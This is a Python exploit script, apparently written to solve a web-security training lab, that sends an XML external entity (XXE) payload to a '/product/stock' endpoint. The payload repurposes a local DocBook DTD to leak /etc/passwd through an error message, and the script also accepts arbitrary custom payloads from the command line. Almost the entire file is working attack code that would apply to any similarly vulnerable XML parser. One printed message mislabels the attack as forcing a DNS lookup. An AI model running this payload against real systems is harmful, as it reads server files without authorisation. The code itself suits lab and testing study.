# Exploiting XXE to retrieve data by repurposing a local DTD

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def send_xxe(s, url, payload):
	check_stock_path = url + '/product/stock'
	if payload == "SOLUTION":
		exploit_body = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE Gwyo [
<!ENTITY % local_dtd SYSTEM "file:////usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27; file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]><stockCheck><productId>7</productId><storeId>1</storeId></stockCheck>"""
	else:
		exploit_body = payload
	headers = {"Content-Type": "application/xml"}
	print('[+] Using payload:\t%s' % exploit_body)
	print('[+] Using headers:\t%s' % headers)
	r = s.post(check_stock_path, data=exploit_body, headers=headers)
	time.sleep(2)
	res = r.text
	print(res)
	return r

def show_usage():
	print('[+] Usage: %s <URL> <PAYLOAD>\n' % sys.argv[0])
	print('[+] Example: %s https://www.target.com $(cat payload09.xml)' % sys.argv[0])
	print('[+] Example: %s https://www.target.com SOLUTION' % sys.argv[0])
	sys.exit(-1)

def main():
	print('[+] Lab: Exploiting XXE to retrieve data by repurposing a local DTD')
	try:
		url = sys.argv[1].strip()
		input_payload = sys.argv[2:]
		if len(input_payload) > 1:
			payload = ' '.join(input_payload).replace('> ', '>').replace('=>', '=> ')
		else:
			payload = ''.join(input_payload)
		if payload == '':
			show_usage()
	except IndexError:
		show_usage()
	s = requests.Session()
	s.proxies = proxies # Comment this line to disable proxies
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text:
			print('\n[-] HOST seems to be down (or proxy missconfigured) <!>')
			sys.exit(-1)
		else:
			print("[+] Trying send a XXE attack to force the target to send a DNS lookup request...")
			r = send_xxe(s, url, payload)
			time.sleep(2)
			r = s.get(url, allow_redirects=False)
			time.sleep(1)
			if r.status_code == 200 and 'Congratulations, you solved the lab!' in r.text:
				print('[+] The lab is solved !')
			elif r.status_code == 200:
				print('[+] The Exploit sent the given payload !')
	except requests.exceptions.ProxyError:
		print('\n[-] PROXY seems to be missconfigured <!>')

if __name__ == "__main__":
	main()
